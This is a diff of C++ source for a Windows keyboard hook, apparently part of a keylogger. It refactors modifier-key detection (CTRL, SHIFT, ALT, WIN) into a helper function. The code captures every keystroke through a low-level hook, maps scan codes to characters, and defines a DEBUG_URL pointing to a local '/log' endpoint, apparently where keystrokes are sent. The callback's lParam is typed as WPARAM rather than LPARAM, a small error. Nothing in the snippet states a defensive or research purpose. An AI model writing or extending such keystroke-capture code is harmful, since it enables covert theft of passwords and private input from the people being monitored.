@@ -6,31 +6,33 @@
 
 const char* DEBUG_URL = "http://127.0.0.1:8000/log";
 
-
-LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, WPARAM lParam) {
-    auto *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
-
+void addCombinationModifier(std::string* input) {
     auto checkModifierStatus = [](int vkCode) {
         return (GetAsyncKeyState(vkCode) & 0x8000) != 0;
     };
+
+    if (checkModifierStatus(VK_CONTROL)) {
+        *input += "CTRL + ";
+    }
+    if (checkModifierStatus(VK_SHIFT)) {
+        *input += "SHIFT + ";
+    }
+    if (checkModifierStatus(VK_MENU)) {
+        *input += "ALT + ";
+    }
+    if (checkModifierStatus(VK_LWIN) || checkModifierStatus(VK_RWIN)) {
+        *input += "WIN + ";
+    }
+}
+
+LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, WPARAM lParam) {
+    auto *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
 
     if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
         char c = MapVirtualKey(kbStruct->vkCode, MAPVK_VK_TO_CHAR);
 
         std::string final;
-
-        if (checkModifierStatus(VK_CONTROL)) {
-            final += "CTRL + ";
-        }
-        if (checkModifierStatus(VK_SHIFT)) {
-            final += "SHIFT + ";
-        }
-        if (checkModifierStatus(VK_MENU)) {
-            final += "ALT + ";
-        }
-        if (checkModifierStatus(VK_LWIN) || checkModifierStatus(VK_RWIN)) {
-            final += "WIN + ";
-        }
+        addCombinationModifier(&final);
 
         if (scanCodeMapFI.find(kbStruct->scanCode) != scanCodeMapFI.end()) {
             final += scanCodeMapFI[kbStruct->scanCode];
